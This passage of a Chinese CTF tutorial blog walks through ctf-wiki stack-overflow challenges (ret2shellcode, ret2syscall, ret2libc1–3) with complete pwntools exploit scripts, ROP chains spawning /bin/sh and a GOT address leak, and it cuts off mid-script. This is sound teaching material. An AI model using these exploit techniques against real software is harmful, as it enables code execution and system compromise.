+<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh=process(<span class="string">'./ret2shellcode'</span>)</span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line">addr=<span class="number">0x804a080</span></span><br><span class="line">sh.sendline(shellcode.ljust(<span class="number">112</span>,<span class="string">'A'</span>)+p32(addr)) <span class="comment">#这里将shellcode和a填充到栈中，总长度为112</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="例3-ret2syscall"><a href="#例3-ret2syscall" class="headerlink" title="例3(ret2syscall)"></a>例3(ret2syscall)</h1><p>ret2syscall <a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2syscall/bamboofox-ret2syscall/rop" target="_blank" rel="noopener">https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2syscall/bamboofox-ret2syscall/rop</a></p>
+<h2 id="查看文件信息"><a href="#查看文件信息" class="headerlink" title="查看文件信息"></a>查看文件信息</h2><p>这是一个静态链接的文件，并且开启了NX保护<br><img src="https://upload-images.jianshu.io/upload_images/14577467-0d369137abe9be78.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<h2 id="ida分析-1"><a href="#ida分析-1" class="headerlink" title="ida分析"></a>ida分析</h2><p>还是get()函数造成溢出，但是没有system()函数<br><img src="https://upload-images.jianshu.io/upload_images/14577467-942e024f0254ff48.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<h2 id="计算偏移-2"><a href="#计算偏移-2" class="headerlink" title="计算偏移"></a>计算偏移</h2><p>还是先确定多少偏移能够覆盖返回地址。方法与上面相同，很容易计算出偏移还是112</p>
+<h2 id="编写exp-1"><a href="#编写exp-1" class="headerlink" title="编写exp"></a>编写exp</h2><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>需要知道一个概念：把对应获取shell的系统调用参数放到对应的寄存器中，之后执行int 80就可执行对应的系统调用</p>
+<p>可以利用execve(“/bin/sh”,NULL,NULL)这个系统调用获取shell</p>
+<p>所以需要符合：<br>1.系统调用号，即 eax 应该为 0xb（exeve的系统调用号为0xb）<br>2.第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执3.行 sh 的地址也可以。<br>4.第二个参数，即 ecx 应该为 0<br>5.第三个参数，即 edx 应该为 0</p>
+<p>之后就要想办法给寄存器赋值了。在汇编中，当栈顶是10时，执行pop eax，这时候eax的值就是10了。所以我们就可以一次一次拼凑出一个shell</p>
+<p>因为程序并没有开启PIE保护，所以程序自身地址是固定的。用ROPgadget工具分析程序成shell调用的代码段，生成一个rop chain,也可以自己拼接</p>
+<p>ROPgadget –binary ./rop –ropchain</p>
+<p>生成里一个模板</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line">	<span class="comment"># execve generated by ROPgadget</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"></span><br><span class="line">	<span class="comment"># Padding goes here</span></span><br><span class="line">	p = <span class="string">''</span></span><br><span class="line"></span><br><span class="line">	p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806eb6a</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">	p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">	p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080bb196</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">	p += <span class="string">'/bin'</span></span><br><span class="line">	p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0809a4ad</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">	p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806eb6a</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">	p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea064</span>) <span class="comment"># @ .data + 4</span></span><br><span class="line">	p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080bb196</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">	p += <span class="string">'//sh'</span></span><br><span class="line">	p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0809a4ad</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">	p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806eb6a</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">	p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">	p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x08054590</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">	p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0809a4ad</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">	p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080481c9</span>) <span class="comment"># pop ebx ; ret</span></span><br><span class="line">	p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">	p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806eb91</span>) <span class="comment"># pop ecx ; pop ebx ; ret</span></span><br><span class="line">	p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">	p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea060</span>) <span class="comment"># padding without overwrite ebx</span></span><br><span class="line">	p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806eb6a</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">	p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">	p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x08054590</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">	p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b5bf</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">	p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b5bf</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">	p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b5bf</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">	p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b5bf</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">	p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b5bf</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">	p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b5bf</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">	p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b5bf</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">	p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b5bf</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">	p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b5bf</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">	p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b5bf</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">	p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b5bf</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">	p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x08049421</span>) <span class="comment"># int 0x80</span></span><br></pre></td></tr></table></figure>
+
+<p>程序跳转到这里就能够获得shell了，也就是将p参数拼接在溢出位置</p>
+<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"> Padding goes here</span><br><span class="line">p = <span class="string">''</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806eb6a</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080bb196</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">p += <span class="string">'/bin'</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0809a4ad</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806eb6a</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea064</span>) <span class="comment"># @ .data + 4</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080bb196</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">p += <span class="string">'//sh'</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0809a4ad</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806eb6a</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x08054590</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0809a4ad</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080481c9</span>) <span class="comment"># pop ebx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806eb91</span>) <span class="comment"># pop ecx ; pop ebx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea060</span>) <span class="comment"># padding without overwrite ebx</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806eb6a</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x08054590</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b5bf</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b5bf</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b5bf</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b5bf</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b5bf</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b5bf</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b5bf</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">&gt;p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b5bf</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b5bf</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b5bf</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b5bf</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x08049421</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = process(<span class="string">'./rop'</span>)</span><br><span class="line">r.sendline(<span class="string">'a'</span> * <span class="number">112</span> +p) </span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="例4-ret2libc1"><a href="#例4-ret2libc1" class="headerlink" title="例4(ret2libc1)"></a>例4(ret2libc1)</h1><p>ret2libc1:<a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc2/ret2libc2" target="_blank" rel="noopener">https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc2/ret2libc2</a></p>
+<h2 id="查看文件信息-1"><a href="#查看文件信息-1" class="headerlink" title="查看文件信息"></a>查看文件信息</h2><p>开启了NX保护，不过和上题不同的是动态链接的，都没什么作用，就是寻找代码多少的问题。。。<br><img src="https://upload-images.jianshu.io/upload_images/14577467-beb336ea4aff2db7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<h2 id="用ida查看"><a href="#用ida查看" class="headerlink" title="用ida查看"></a>用ida查看</h2><p>还是get()函数<br><img src="https://upload-images.jianshu.io/upload_images/14577467-af2a943d204912b9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<p>但是调用了system函数<br><img src="https://upload-images.jianshu.io/upload_images/14577467-01fe2a0889398a35.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<h2 id="计算偏移-3"><a href="#计算偏移-3" class="headerlink" title="计算偏移"></a>计算偏移</h2><p>还是同样的方法得到偏移是112</p>
+<h2 id="编写exp-2"><a href="#编写exp-2" class="headerlink" title="编写exp"></a>编写exp</h2><h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><p>虽然有system()函数，但是函数中的参数不是我们需要的</p>
+<h4 id="思路1（不可行）"><a href="#思路1（不可行）" class="headerlink" title="思路1（不可行）"></a>思路1（不可行）</h4><p>那就先试试上一题的思路，用ropgadget<code>ROPgadget --binary ./ret2libc1 --ropchain</code>返回结果失败了<code>[-] Can&#39;t find the &#39;mov dword ptr [r32], r32&#39; gadget</code>    找不到对应的代码段</p>
+<h4 id="思路二（可行）"><a href="#思路二（可行）" class="headerlink" title="思路二（可行）"></a>思路二（可行）</h4><p>前面已经发现可以利用的函数，这时候需要参数，其实这里就是上一题的分解步骤，因为不能直接跳转到system(“shell!?”),这时候需要在程序中查找“/bin/sh”字符串,f返回到这里就行了</p>
+<p>在0x8049720存在/bin/sh<br><img src="https://upload-images.jianshu.io/upload_images/14577467-4b315937e982dba4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">'./ret2libc1'</span>)</span><br><span class="line">elf=ELF(<span class="string">'./ret2libc1'</span>)</span><br><span class="line">p.sendline(<span class="string">'a'</span>*<span class="number">112</span> + p32(elf.plt[<span class="string">'system'</span>])+<span class="string">'aaaa'</span> + p32(<span class="number">0x8049720</span>)) <span class="comment">#elf.plt['system']从plt表中搜索函数</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>如果是正常调用 system 函数，调用的时候会有一个对应的返回地址，这里以’aaaa’ 作为虚假的地址，其后参数对应的参数内容。这一题提供了system函数和对应的字符串，还是比较简单的</p>
+<h1 id="例5（ret2libc2）"><a href="#例5（ret2libc2）" class="headerlink" title="例5（ret2libc2）"></a>例5（ret2libc2）</h1><p>ret2libc2 <a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc2/ret2libc2" target="_blank" rel="noopener">https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc2/ret2libc2</a></p>
+<h2 id="查看基本信息"><a href="#查看基本信息" class="headerlink" title="查看基本信息"></a>查看基本信息</h2><p>依然是NX保护，依然是动态链接<br><img src="https://upload-images.jianshu.io/upload_images/14577467-ebef5a512b86ca0d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<h2 id="ida分析-2"><a href="#ida分析-2" class="headerlink" title="ida分析"></a>ida分析</h2><p>get()函数造成溢出<br><img src="https://upload-images.jianshu.io/upload_images/14577467-2bd69024284bf0b6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<p>system中的函数还是存在问题<br><img src="https://upload-images.jianshu.io/upload_images/14577467-bf381d3ffae8a9c0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<h2 id="计算偏移-4"><a href="#计算偏移-4" class="headerlink" title="计算偏移"></a>计算偏移</h2><p>方法相同，用cyclic计算偏移还是112</p>
+<h2 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h2><p>还是上一题的思路，在程序中查找”/bin/sh”字符串，发现找不到这个字符串<code>ROPgadget --binary ./ret2libc2 --string &#39;/bin/sh&#39;</code><br><img src="https://upload-images.jianshu.io/upload_images/14577467-da9d1eee326fdfde.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<p>这时候可以利用gets()函数将’/bin/sh’这个字符串读取到栈中，然后调用就行了。要想执行完gets后执行system函数而不是直接返回地址，这时候我们得shellcode就需要两个函数，两个函数的链接就需要继续用到ROP将两个函数链接。而其中的以ret结尾的代码就叫gadget。所以需要使用ROPgadget查找一个pop ebx；ret的地址。<code>ROPgadget --binary ./ret2libc2 --only &#39;pop|ret&#39; |grep &#39;ebx&#39;</code><br><img src="https://upload-images.jianshu.io/upload_images/14577467-bceda3bb3bb56509.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<p>如果程序中存在pop eax; ret,地址为100，用100替换aaaa,则执行完gets后会执行</p>
+<p>pop eax;ret,</p>
+<p>如果p.sendline(‘a’*112+p32(elf.plt[‘gets’])+’aaaa’+p32(elf.bss()+0x100)+’bbbb’)</p>
+<p>就会执行bbbb</p>
+<p>像pop eax; ret这样的以ret结尾的代码成为gadget</p>
+<p>寻找gadget可以用ROPgadget手动寻找，也可以用pwntools中的模块自动寻找</p>
+<h2 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">'./ret2libc2'</span>)</span><br><span class="line">elf=ELF(<span class="string">'./ret2libc2'</span>)</span><br><span class="line">rop=ROP(elf)</span><br><span class="line">p.sendline(<span class="string">'a'</span>*<span class="number">112</span> + p32(elf.plt[<span class="string">'gets'</span>])+p32(rop.search(<span class="number">8</span>).address)+p32(elf.bss()+<span class="number">0x100</span>) + p32(elf.plt[<span class="string">'system'</span>])+<span class="string">'aaaa'</span> +p32(elf.bss()+<span class="number">0x100</span>)）</span><br><span class="line">p.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><code>p.sendline(&#39;a&#39;*112 + p32(elf.plt[&#39;gets&#39;]) +p32(rop.search(8).address)+p32(elf.bss()+0x100) + p32(elf.plt[&#39;system&#39;])+&#39;aaaa&#39; +p32(elf.bss()+0x100))</code><br>这就是执行了gets(elf.bss()+0x100)后执行system(elf.bss()+0x100),中间通过gadget连接起来</p>
+<h1 id="例6-ret2libc3"><a href="#例6-ret2libc3" class="headerlink" title="例6(ret2libc3)"></a>例6(ret2libc3)</h1><p>ret2libc3 <a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc3/ret2libc3" target="_blank" rel="noopener">https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc3/ret2libc3</a></p>
+<h2 id="查看文件信息-2"><a href="#查看文件信息-2" class="headerlink" title="查看文件信息"></a>查看文件信息</h2><p>开启了NX，依然是动态链接的<br><img src="https://upload-images.jianshu.io/upload_images/14577467-61dc054548b12abb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<h2 id="ida分析-3"><a href="#ida分析-3" class="headerlink" title="ida分析"></a>ida分析</h2><p>gets函数造成溢出<br><img src="https://upload-images.jianshu.io/upload_images/14577467-91245c53aa487e34.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<p>与上一题不同的是，不仅没有’/bin/sh’，system函数的地址也不知道<br><img src="https://upload-images.jianshu.io/upload_images/14577467-85bdfd42059fd8f6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<h2 id="计算偏移-5"><a href="#计算偏移-5" class="headerlink" title="计算偏移"></a>计算偏移</h2><p>。。。还是112</p>
+<h2 id="思路-4"><a href="#思路-4" class="headerlink" title="思路"></a>思路</h2><p>找不到可以利用的函数和参数，可以在动态链接的文件中获取。</p>
+<p>第一步要通过地址泄露来判断目标服务器的libc版本</p>
+<p>通过pwntools，从plt表中找到puts函数的地址执行，并把got表内的puts地址当成参数。这样就能输出puts函数的地址。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">p = process(<span class="string">'./ret2libc3'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./ret2libc3'</span>)</span><br><span class="line"><span class="keyword">if</span> args.G:     <span class="comment">#开启调试标记</span></span><br><span class="line">    gdb.attach(p)</span><br><span class="line">p.sendlineafter(<span class="string">'!?'</span>,<span class="string">'a'</span>*<span class="number">112</span>+p32(elf.plt[<span class="string">'puts'</span>])+<span class="string">'aaaa'</span>+p32(elf.got[<span class="string">'puts'</span>]))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>结果是：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[DEBUG] Sent 0x7d bytes:</span><br><span class="line">    00000000  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│</span><br><span class="line">    *</span><br><span class="line">    00000070  60 84 04 08  61 61 61 61  18 a0 04 08  0a           │`···│aaaa│····│·│</span><br><span class="line">    0000007d</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">[DEBUG] Received 0x1d bytes:</span><br><span class="line">    00000000  a0 bc d7 f7  76 84 04 08  86 84 04 08  40 45 d3 f7  │····│v···│····│@E··│</span><br><span class="line">    00000010  60 c3 d7 f7  b6 84 04 08  c6 84 04 08  0a           │`···│····│····│·│</span><br><span class="line">    0000001d</span><br><span class="line">\xa0\xbc��v\x84\x0\x86\x84\x0@E��`�����Ƅ\x0</span><br></pre></td></tr></table></figure>
+
+<h3 id="获取libc版本"><a href="#获取libc版本" class="headerlink" title="获取libc版本"></a>获取libc版本</h3><p>用ibc-database工具查找libc的对应的版本<br><img src="https://upload-images.jianshu.io/upload_images/14577467-672cf02ac476fa47.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<p>下载对应的libc版本放入到exp路径</p>
+<h3 id="查找’-bin-sh’"><a href="#查找’-bin-sh’" class="headerlink" title="查找’/bin/sh’"></a>查找’/bin/sh’</h3><p><code>ROPgadget --binary libc.so --string &#39;/bin/sh&#39;</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Strings information</span><br><span class="line">=============================================</span><br><span class="line">0x0015ba0b : /bin/sh</span><br></pre></td></tr></table></figure>
+
+<h3 id="获取主函数地址"><a href="#获取主函数地址" class="headerlink" title="获取主函数地址"></a>获取主函数地址</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:08048618 ; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">.text:08048618                 public main</span><br><span class="line">.text:08048618 main            proc near               ; DATA XREF: _start+17o</span><br><span class="line">.text:08048618</span><br><span class="line">.text:08048618 argc            = dword ptr  8</span><br><span class="line">.text:08048618 argv            = dword ptr  0Ch</span><br><span class="line">.text:08048618 envp</span><br></pre></td></tr></table></figure>
+
+<h3 id="基本利用思路"><a href="#基本利用思路" class="headerlink" title="基本利用思路"></a>基本利用思路</h3><p>泄露 __libc_start_main 地址</p>
+<p>获取 libc 版本</p>
+<p>获取 system 地址与 /bin/sh 的地址</p>
+<p>再次执行源程序</p>
+<p>触发栈溢出执行 system(‘/bin/sh’)</p>
+<h2 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">sh = process(<span 